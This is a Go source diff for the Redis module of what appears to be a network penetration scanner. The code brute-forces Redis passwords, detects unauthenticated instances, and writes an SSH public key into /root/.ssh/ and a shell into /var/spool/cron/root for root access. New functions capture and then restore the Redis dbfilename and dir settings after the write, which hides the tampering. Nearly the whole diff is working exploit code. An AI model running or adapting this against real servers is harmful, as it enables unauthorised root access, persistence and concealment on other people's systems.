@@ -10,7 +10,13 @@ import (
 	"time"
 )
 
+var (
+	dbfilename   string
+	dir          string
+)
+
 func RedisScan(info *common.HostInfo) (tmperr error) {
+	starttime := time.Now().Unix()
 	flag, err := RedisUnauth(info)
 	if flag == true && err == nil {
 		return err
@@ -21,9 +27,15 @@ func RedisScan(info *common.HostInfo) (tmperr error) {
 		if flag == true && err == nil {
 			return err
 		} else {
-			errlog := fmt.Sprintf("[-] redis %v %v %v %v %v", info.Host, common.PORTList["redis"], pass, err)
+			errlog := fmt.Sprintf("[-] redis %v:%v %v %v", info.Host, info.Ports, pass, err)
 			common.LogError(errlog)
 			tmperr = err
+			if common.CheckErrs(err) {
+				return err
+			}
+			if time.Now().Unix()-starttime > (int64(len(common.Passwords)) * info.Timeout) {
+				return err
+			}
 		}
 	}
 	return tmperr
@@ -31,12 +43,16 @@ func RedisScan(info *common.HostInfo) (tmperr error) {
 
 func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
 	flag = false
-	realhost := fmt.Sprintf("%s:%d", info.Host, common.PORTList["redis"])
+	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
 	conn, err := net.DialTimeout("tcp", realhost, time.Duration(info.Timeout)*time.Second)
 	if err != nil {
 		return flag, err
 	}
 	defer conn.Close()
+	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.Timeout)*time.Second))
+	if err != nil {
+		return flag, err
+	}
 	_, err = conn.Write([]byte(fmt.Sprintf("auth %s\r\n", pass)))
 	if err != nil {
 		return flag, err
@@ -46,22 +62,33 @@ func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
 		return flag, err
 	}
 	if strings.Contains(reply, "+OK") {
-		result := fmt.Sprintf("[+] Redis:%s %s", realhost, pass)
-		common.LogSuccess(result)
 		flag = true
-		Expoilt(realhost, conn)
+		dbfilename, dir, err = getconfig(conn)
+		if err != nil {
+			result := fmt.Sprintf("[+] Redis:%s %s", realhost, pass)
+			common.LogSuccess(result)
+			return flag,err
+		}else {
+			result := fmt.Sprintf("[+] Redis:%s %s file:%s/%s", realhost, pass, dir, dbfilename)
+			common.LogSuccess(result)
+		}
+		err = Expoilt(realhost, conn)
 	}
 	return flag, err
 }
 
 func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
 	flag = false
-	realhost := fmt.Sprintf("%s:%d", info.Host, common.PORTList["redis"])
+	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
 	conn, err := net.DialTimeout("tcp", realhost, time.Duration(info.Timeout)*time.Second)
 	if err != nil {
 		return flag, err
 	}
 	defer conn.Close()
+	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.Timeout)*time.Second))
+	if err != nil {
+		return flag, err
+	}
 	_, err = conn.Write([]byte("info\r\n"))
 	if err != nil {
 		return flag, err
@@ -71,10 +98,17 @@ func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
 		return flag, err
 	}
 	if strings.Contains(reply, "redis_version") {
-		result := fmt.Sprintf("[+] Redis:%s unauthorized", realhost)
-		common.LogSuccess(result)
 		flag = true
-		Expoilt(realhost, conn)
+		dbfilename, dir, err = getconfig(conn)
+		if err != nil {
+			result := fmt.Sprintf("[+] Redis:%s unauthorized", realhost)
+			common.LogSuccess(result)
+			return flag,err
+		}else {
+			result := fmt.Sprintf("[+] Redis:%s unauthorized file:%s/%s", realhost,dir,dbfilename)
+			common.LogSuccess(result)
+		}
+		err = Expoilt(realhost, conn)
 	}
 	return flag, err
 }
@@ -85,24 +119,25 @@ func Expoilt(realhost string, conn net.Conn) error {
 		return err
 	}
 	if flagSsh == true {
-		result := fmt.Sprintf("Redis:%v like can write /root/.ssh/", realhost)
+		result := fmt.Sprintf("[+] Redis:%v like can write /root/.ssh/", realhost)
 		common.LogSuccess(result)
 		if common.RedisFile != "" {
 			writeok, text, err := writekey(conn, common.RedisFile)
 			if err != nil {
+				fmt.Println(fmt.Sprintf("[-] %v SSH write key errer: %v", realhost, text))
 				return err
 			}
 			if writeok {
-				result := fmt.Sprintf("%v SSH public key was written successfully", realhost)
+				result := fmt.Sprintf("[+] %v SSH public key was written successfully", realhost)
 				common.LogSuccess(result)
 			} else {
-				fmt.Println("Redis:", realhost, "SSHPUB write failed", text)
+				fmt.Println("[-] Redis:", realhost, "SSHPUB write failed", text)
 			}
 		}
 	}
 
 	if flagCron == true {
-		result := fmt.Sprintf("Redis:%v like can write /var/spool/cron/", realhost)
+		result := fmt.Sprintf("[+] Redis:%v like can write /var/spool/cron/", realhost)
 		common.LogSuccess(result)
 		if common.RedisShell != "" {
 			writeok, text, err := writecron(conn, common.RedisShell)
@@ -110,13 +145,14 @@ func Expoilt(realhost string, conn net.Conn) error {
 				return err
 			}
 			if writeok {
-				result := fmt.Sprintf("%v /var/spool/cron/root was written successfully", realhost)
+				result := fmt.Sprintf("[+] %v /var/spool/cron/root was written successfully", realhost)
 				common.LogSuccess(result)
 			} else {
-				fmt.Println("Redis:", realhost, "cron write failed", text)
+				fmt.Println("[-] Redis:", realhost, "cron write failed", text)
 			}
 		}
 	}
+	err = recoverdb(dbfilename, dir, conn)
 	return err
 }
 
@@ -247,14 +283,15 @@ func Readfile(filename string) (string, error) {
 }
 
 func readreply(conn net.Conn) (result string, err error) {
-	buf := make([]byte, 4096)
+	size := 5 * 1024
+	buf := make([]byte, size)
 	for {
 		count, err := conn.Read(buf)
 		if err != nil {
 			break
 		}
 		result += string(buf[0:count])
-		if count < 4096 {
+		if count < size {
 			break
 		}
 	}
@@ -286,4 +323,56 @@ func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
 		flagCron = true
 	}
 	return flag, flagCron, err
+}
+
+func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
+	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG GET dbfilename\r\n")))
+	if err != nil {
+		return
+	}
+	text, err := readreply(conn)
+	if err != nil {
+		return
+	}
+	text1 := strings.Split(text, "\r\n")
+	if len(text1) > 2 {
+		dbfilename = text1[len(text1)-2]
+	} else {
+		dbfilename = text1[0]
+	}
+	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG GET dir\r\n")))
+	if err != nil {
+		return
+	}
+	text, err = readreply(conn)
+	if err != nil {
+		return
+	}
+	text1 = strings.Split(text, "\r\n")
+	if len(text1) > 2 {
+		dir = text1[len(text1)-2]
+	} else {
+		dir = text1[0]
+	}
+	return
+}
+
+func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
+	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", dbfilename)))
+	if err != nil {
+		return
+	}
+	dbfilename, err = readreply(conn)
+	if err != nil {
+		return
+	}
+	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dir)))
+	if err != nil {
+		return
+	}
+	dir, err = readreply(conn)
+	if err != nil {
+		return
+	}
+	return
 }
